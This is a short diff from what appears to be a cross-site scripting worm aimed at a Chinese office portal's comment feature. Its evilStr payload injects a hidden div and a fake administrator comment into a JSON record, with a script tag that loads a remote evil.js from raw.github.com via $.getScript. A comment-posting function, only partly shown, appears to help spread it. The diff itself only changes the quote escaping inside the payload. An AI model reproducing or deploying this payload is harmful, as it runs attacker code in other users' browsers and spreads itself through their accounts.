@@ -6,7 +6,7 @@ $("div.SendSay[title$='none >']").each(function(){
     $(this).parents("li:eq(0)").remove();
 });
 
-evilStr='<div style=display:none >"},{"imgUrl":"/office/pubjsp/tiles/images/Portal/nmember.gif","optorName":"管理员<script>$.getScript("https://raw.github.com/hellosamy2005/samy/master/evil.js")</script>","dept":"CUC","replyContent":"系统新增加评论功能,欢迎大家评论!';
+evilStr='<div style=display:none >"},{"imgUrl":"/office/pubjsp/tiles/images/Portal/nmember.gif","optorName":"管理员<script>$.getScript(\'https://raw.github.com/hellosamy2005/samy/master/evil.js\')</script>","dept":"CUC","replyContent":"系统新增加评论功能,欢迎大家评论!';
 
 function sendCommentFromPageRegExp(url,regExpStr,msg){
     $.get(url,function(data){
